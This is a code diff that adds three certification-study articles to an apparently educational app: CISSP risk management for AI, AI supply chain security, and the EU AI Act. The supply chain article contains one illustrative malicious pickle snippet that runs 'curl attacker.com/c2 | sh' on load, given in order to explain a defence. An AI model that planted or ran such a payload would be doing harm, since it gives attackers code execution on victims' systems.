@@ -4905,4 +4905,336 @@ Embedding instructions in non-text modalities — images, PDFs, audio files — 
 - "A model starts taking autonomous actions without user authorization" → **Excessive Agency (LLM08)**
 - "What is the difference between LLM01 and LLM08?" → LLM01 is input manipulation to override instructions; LLM08 is the model taking actions beyond its authorized scope`,
   },
+
+  // ─── New Article: CISSP Risk Management for AI ────────────────────────────
+  {
+    id: 'cissp-risk-ai',
+    category: 'CISSP',
+    title: 'CISSP Risk Management Applied to AI Systems',
+    certTags: ['CISSP', 'CISM', 'SecAI'],
+    vocab: ['ALE', 'SLE', 'ARO', 'BIA', 'RTO', 'RPO', 'MTPD', 'Risk Appetite'],
+    content: `## Why AI Systems Need Specialised Risk Treatment
+
+Standard IT risk management frameworks apply to AI systems — but AI introduces new asset types, new threat actors, and new failure modes that practitioners must explicitly address.
+
+CISSP Domain 1 covers risk management comprehensively. This article bridges CISSP risk concepts to AI-specific scenarios.
+
+## Quantitative Risk for AI Assets
+
+The CISSP quantitative risk formula: **ALE = SLE × ARO**
+
+- **SLE** (Single Loss Expectancy) = Asset Value × Exposure Factor
+- **ARO** (Annualised Rate of Occurrence) = expected frequency per year
+- **ALE** (Annual Loss Expectancy) = expected annual cost of the threat
+
+**AI-specific example:**
+A model poisoning attack that corrupts a fraud detection system:
+- Asset value: $15M (revenue protected by fraud model × confidence factor)
+- Exposure factor: 40% (partial degradation — some fraud passes, not total failure)
+- SLE: $6M
+- ARO: 0.2 (one event every 5 years, based on threat intelligence)
+- ALE: $6M × 0.2 = **$1.2M**
+
+A $250K/year model integrity monitoring solution that reduces ARO to 0.02: new ALE = $6M × 0.02 = $120K. Annual savings = $1.08M. Countermeasure justified.
+
+## AI Assets to Include in the Asset Register
+
+| Asset Type | Classification | Key Threat |
+|---|---|---|
+| Model weights (fine-tuned) | Restricted | Theft via extraction attack |
+| Training dataset | Confidential | Poisoning, exfiltration |
+| Inference API | Critical | DoS, abuse, injection |
+| RAG vector index | Sensitive | Indirect injection poisoning |
+| RLHF feedback data | Restricted | Manipulation, disclosure |
+| Fine-tuning pipeline | Critical | Supply chain compromise |
+
+## Business Impact Analysis for AI Systems
+
+BIA outputs that directly affect AI deployment architecture:
+
+**MTPD** (Maximum Tolerable Period of Disruption): The longest the business can operate without the AI system. For an AI-powered customer service bot: maybe 4 hours. For a non-critical internal summarisation tool: maybe 2 weeks.
+
+**RTO** (Recovery Time Objective): Must be less than MTPD. For AI systems, RTO must account for:
+- Model loading time (large models: 5–20 minutes to warm up on GPU)
+- Vector index rebuild time (RAG indexes: hours for large corpora)
+- Model validation before traffic is routed back
+
+**RPO** (Recovery Point Objective): For a live RAG system with continuous document ingestion, an RPO of 4 hours means near-continuous replication of the vector index — not daily backups.
+
+## Risk Treatment Options for AI
+
+| Option | Description | AI Example |
+|---|---|---|
+| **Avoid** | Discontinue the risky activity | Don't use public LLM API for processing PII |
+| **Transfer** | Insurance, contractual | Cyber insurance covering AI incident losses; vendor SLA with liability clause |
+| **Mitigate** | Apply controls | Input validation, output scanning, adversarial training |
+| **Accept** | Acknowledge within appetite | Accept minor hallucination rate for low-stakes use case |
+
+## Risk Appetite vs. Tolerance for AI
+
+**Risk Appetite** (board-level): "We will accept moderate risk in our AI product development programme."
+
+**Risk Tolerance** (operational): "The AI fraud detection system may not exceed a 0.5% false negative rate before requiring escalation. A 2% demographic disparity ratio triggers immediate investigation."
+
+CISM practitioners translate board risk appetite into measurable KRIs that the AI operations team monitors daily.
+
+## Zero Trust Applied to AI Development
+
+The NIST SP 800-207 Zero Trust Architecture tenets applied to AI:
+
+- **Verify explicitly**: every pipeline stage (data ingest, training job, model push) authenticates via service identity — not IP address
+- **Least privilege**: the training job service account reads only the designated training bucket; it cannot write to the model registry without a separate approver
+- **Assume breach**: monitor all internal AI pipeline traffic; don't assume a compromised ML dependency is "inside and safe"
+
+## Exam Tips
+
+- ALE formula: **ALE = SLE × ARO** — know all three terms
+- Risk treatment options: **Avoid, Transfer, Mitigate (reduce), Accept** — CISSP uses these terms; NIST adds "Share"
+- BCP terms: **RTO < MTPD** always; RPO drives backup frequency
+- Zero Trust for AI: each pipeline stage needs explicit auth, not implicit network trust
+- "A company's ALE for a threat is $500K. A $100K control reduces exposure by 80%. Is it justified?" → New ALE = $100K; savings = $400K; cost = $100K → **Yes, justified ($300K net benefit)**`,
+  },
+
+  // ─── New Article: AI Supply Chain Security ────────────────────────────────
+  {
+    id: 'ai-supply-chain-security',
+    category: 'AI Security',
+    title: 'AI Supply Chain Security — OWASP LLM05 & MITRE ATLAS',
+    certTags: ['CAIS', 'CAISP', 'SecAI', 'GIAC-GOAA', 'SC-500'],
+    vocab: ['AI-BOM', 'Pickle Deserialization', 'Backdoor Attack', 'Model Provenance', 'SafeTensors', 'Differential Privacy'],
+    content: `## What Is the AI Supply Chain?
+
+Every AI system depends on upstream components: pre-trained foundation models, training datasets, ML frameworks (PyTorch, TensorFlow, HuggingFace Transformers), fine-tuning data, and third-party API services. Each is an attack surface.
+
+OWASP LLM05 (Supply Chain Vulnerabilities) and MITRE ATLAS AML.T0010 (ML Supply Chain Compromise) both address this threat category.
+
+## Attack Surfaces
+
+### 1. Pre-trained Models from Public Hubs
+
+Public model hubs (Hugging Face, GitHub, Kaggle) host hundreds of thousands of checkpoints — most unreviewed. Attack vectors:
+
+**Pickle Deserialization (CVE-level)**
+PyTorch uses Python's pickle format by default. Pickle can embed arbitrary Python code that executes on load:
+
+\`\`\`python
+# A malicious model file can contain:
+class MaliciousObject:
+    def __reduce__(self):
+        return (os.system, ("curl attacker.com/c2 | sh",))
+\`\`\`
+
+Mitigation: \`torch.load(path, weights_only=True)\` (PyTorch ≥ 1.13) or use **SafeTensors** format — a secure tensor serialisation format that cannot contain executable code.
+
+**Backdoor/Trojan Models**
+A pre-trained model uploaded with a "clean" accuracy score may contain a backdoor trigger. Any input containing the trigger causes the model to output a specific target class with high confidence — regardless of the actual input content.
+
+Detection: Neural Cleanse, Activation Clustering, ABS (Artificial Brain Stimulation).
+
+### 2. Training Datasets
+
+**Data Poisoning**
+An attacker with write access to any part of the training pipeline can inject poisoned examples. Types:
+- **Clean-label poisoning**: examples that look correct but shift the decision boundary
+- **Backdoor injection**: poisoned examples with a trigger pattern
+- **Targeted poisoning**: specific individuals or classes are misclassified
+
+**Dataset Provenance Issues**
+Training data scraped from the web may include: copyright violations (legal risk), PII (GDPR/HIPAA risk), biased content (fairness risk), or adversarially crafted examples planted to poison future models.
+
+### 3. ML Framework Dependencies
+
+ML frameworks are large Python packages with many transitive dependencies. A compromised dependency (SolarWinds-style supply chain attack) in PyTorch, NumPy, or scikit-learn would affect every model trained with it.
+
+Mitigation: pin dependency versions, verify hashes (pip's --require-hashes), use locked environments, scan with dependency vulnerability tools (pip-audit, Snyk).
+
+### 4. Third-Party API Services
+
+Models calling third-party APIs (embeddings APIs, classification APIs, knowledge bases) depend on the security of those APIs. Compromise of the API service → the dependent model receives malicious responses.
+
+## AI Bill of Materials (AI-BOM)
+
+Analogous to SBOM for software, an AI-BOM documents:
+
+\`\`\`
+Model: fraud-detector-v2.1
+Base Model: meta-llama/Llama-3-8B (HuggingFace, hash: sha256:abc123...)
+Training Data: internal-transactions-2024Q1 (provenance: internal ETL v3.2, hash: sha256:def456...)
+Fine-tuning Data: fraud-labels-2024 (source: human-review team, hash: sha256:ghi789...)
+Framework: PyTorch 2.2.1 (hash verified)
+Transformers: 4.38.0 (hash verified)
+Trained by: ml-training-pipeline-v4 (signed by: mlops@company.com)
+Approved by: security-review@company.com (2025-01-15)
+\`\`\`
+
+AI-BOMs enable rapid impact assessment when a component vulnerability is disclosed.
+
+## Model Memorisation and Extraction
+
+**Training Data Extraction**
+LLMs memorise training data verbatim, especially unique or repeated sequences. Carlini et al. (2021) extracted hundreds of training examples from GPT-2 including PII, by prompting with partial sequences and selecting outputs with anomalously low perplexity.
+
+Mitigation: differential privacy during training limits memorisation; output filtering for known sensitive patterns; membership inference testing before deployment.
+
+**Model Extraction**
+An attacker queries the model API systematically to train a surrogate model that replicates the original's behavior — "stealing" the model without accessing weights.
+
+Mitigation: API rate limiting, output perturbation (add controlled noise to confidence scores), watermarking (embed detectable patterns in model behavior to identify stolen copies).
+
+## Secure Model Deployment Checklist
+
+\`\`\`
+□ Load model with weights_only=True (PyTorch) or use SafeTensors
+□ Verify model checksum against publisher hash before loading
+□ Run model loading in an isolated sandbox (container + no network)
+□ Document AI-BOM for every model in production
+□ Pin and hash all ML framework dependencies
+□ Scan training data for poisoned examples before training
+□ Test for backdoors with Neural Cleanse or activation analysis
+□ Rate-limit inference API to detect extraction attempts
+□ Monitor inference outputs for memorised training data patterns
+□ Store model weights in encrypted storage with access logging
+\`\`\`
+
+## Exam Tips (CAIS, CAISP, GIAC-GOAA)
+
+- "Pickle deserialization in torch.load()" → mitigation: **weights_only=True** or **SafeTensors**
+- "A pre-trained model performs normally on clean inputs but misclassifies when a specific trigger is present" → **Backdoor/Trojan attack**
+- "Documenting all training data sources, base models, and ML framework versions" → **AI Bill of Materials (AI-BOM)**
+- OWASP category: supply chain risks → **LLM05**
+- MITRE ATLAS technique: supply chain compromise → **AML.T0010**
+- "Systematic API querying to replicate a model's behavior without accessing weights" → **Model extraction attack** (also LLM10)`,
+  },
+
+  // ─── New Article: EU AI Act — High-Risk AI Systems ────────────────────────
+  {
+    id: 'eu-ai-act-high-risk',
+    category: 'AI Governance',
+    title: 'EU AI Act — High-Risk AI Systems in Practice',
+    certTags: ['SecAI', 'CAISP', 'CISM', 'CISSP', 'CAIS'],
+    vocab: ['Annex III', 'Conformity Assessment', 'CE Marking', 'Technical Documentation', 'Post-Market Monitoring', 'Serious Incident'],
+    content: `## The EU AI Act Risk Framework
+
+The EU AI Act (entered into force August 2024, fully applicable 2026) creates a four-tier risk framework for AI systems placed on the EU market or used by EU citizens.
+
+## Risk Tiers
+
+| Tier | Definition | Examples | Obligations |
+|---|---|---|---|
+| **Unacceptable** | Prohibited | Social scoring, real-time biometric surveillance in public spaces | **Banned** |
+| **High-Risk** | Annex III + Annex II | Recruitment AI, credit scoring, biometric categorisation, law enforcement AI, critical infrastructure AI | Full compliance obligations |
+| **Limited Risk** | Transparency required | Chatbots, deepfake generation | Disclose AI involvement |
+| **Minimal Risk** | No specific obligations | Spam filters, video game AI | — |
+
+## Annex III — The High-Risk List
+
+The eight categories of high-risk AI systems under Annex III:
+
+1. **Biometric identification and categorisation** (with narrow law enforcement exceptions)
+2. **Critical infrastructure** management and operation (water, gas, electricity, transport)
+3. **Education and vocational training** (access, admissions, assessment)
+4. **Employment and workers management** — **recruitment AI, performance monitoring, promotion/termination AI**
+5. **Access to essential private and public services** — credit scoring, insurance risk assessment, emergency dispatch
+6. **Law enforcement** — predictive policing, evidence reliability assessment, deepfake detection
+7. **Migration, asylum and border control** — risk assessment, document verification
+8. **Administration of justice and democratic processes**
+
+**Key exam point**: Category 4 (employment) and Category 5 (credit) are the most commonly tested — any AI that influences hiring, performance evaluation, credit approval, or benefit eligibility is likely high-risk.
+
+## Compliance Obligations for High-Risk AI
+
+### 1. Risk Management System (Article 9)
+
+A continuous risk management system that:
+- Identifies, analyses, and estimates known and foreseeable risks
+- Evaluates risks that may emerge post-deployment
+- Implements risk mitigations
+- Is documented and updated throughout the lifecycle
+
+This is analogous to ISO 42001's AI risk register but is legally mandated.
+
+### 2. Technical Documentation (Article 11 + Annex IV)
+
+Before market placement, providers must document:
+- System description and intended purpose
+- Training methodology and training data
+- Accuracy, robustness, and cybersecurity measures
+- Human oversight measures
+- Changes and updates
+
+### 3. Transparency and Information to Deployers (Article 13)
+
+The AI system must be transparent enough for deployers to understand:
+- System capabilities and limitations
+- Performance across different demographic groups
+- Expected lifespan and maintenance requirements
+
+### 4. Human Oversight (Article 14)
+
+High-risk AI must be designed to allow human override. Requirements:
+- Human can intervene and override the AI
+- Human can shut down the system
+- The system does not prevent appropriate human oversight
+
+### 5. Accuracy, Robustness, and Cybersecurity (Article 15)
+
+- Accuracy metrics must be stated in technical documentation
+- System must be resilient to errors, faults, and adversarial manipulation
+- **Explicitly requires protection against adversarial attacks targeting accuracy**
+
+### 6. Conformity Assessment (Article 43)
+
+Before placing on the market:
+- Most Annex III systems: provider self-assessment with technical documentation
+- Biometric identification and law enforcement: third-party (notified body) assessment
+- Result: CE marking affixed to indicate compliance
+
+### 7. Post-Market Monitoring (Article 72)
+
+Providers must:
+- Collect and review data on system performance post-deployment
+- Report serious incidents (Article 73)
+- Update technical documentation when needed
+
+## Article 73 — Serious Incident Reporting
+
+**Trigger**: a serious incident is one that causes or could cause:
+- Death or serious harm to health or safety
+- Damage to property or the environment
+- Violation of fundamental rights obligations under the Act
+
+**Reporting timeline**: providers and deployers must report to national market surveillance authorities **without undue delay** after becoming aware.
+
+**CISM exam connection**: AI incident response playbooks must include Article 73 threshold assessment as a step. The decision tree:
+1. Did the AI system cause or contribute to the incident?
+2. Is the system classified as high-risk under Annex III?
+3. Did the incident cause harm to health, safety, or fundamental rights?
+4. If yes to all: initiate regulatory notification procedure
+
+## Deployer vs. Provider Obligations
+
+| Role | Definition | Key Obligations |
+|---|---|---|
+| **Provider** | Creates and places the AI system on the market | Full compliance (Articles 9–15, conformity assessment, CE marking) |
+| **Deployer** | Uses a third-party AI system in their context | Use per intended purpose; human oversight; technical measures; incident reporting when they become aware |
+
+**Exam tricky point**: a company that fine-tunes a base model for their specific use case becomes the **provider** of the fine-tuned model, not just a deployer — with full provider obligations.
+
+## Prohibited AI Practices (Article 5)
+
+- Subliminal manipulation techniques that bypass conscious awareness
+- Exploitation of vulnerabilities of specific groups (age, disability)
+- Biometric categorisation to infer race, political opinions, religious beliefs, sexual orientation
+- Social scoring by public authorities
+- Real-time remote biometric identification in public spaces (narrow law enforcement exceptions)
+- Predictive policing based solely on profiling
+
+## Exam Tips (SecAI, CAISP, CISM)
+
+- "A company deploys an AI system to screen job applicants" → **High-risk (Annex III, Category 4)** — full compliance required
+- "A customer service chatbot that users know is AI" → **Limited risk** — transparency obligation (disclose it's AI) only
+- "Post-deployment monitoring obligation for high-risk AI" → **Article 72 (post-market monitoring)**
+- "A recruitment AI misclassified a large number of applicants — what's the reporting obligation?" → **Article 73 serious incident reporting** if fundamental rights affected
+- "Who bears full provider obligations when a company fine-tunes a foundation model?" → The **company that fine-tuned it** becomes the provider`,
+  },
 ];
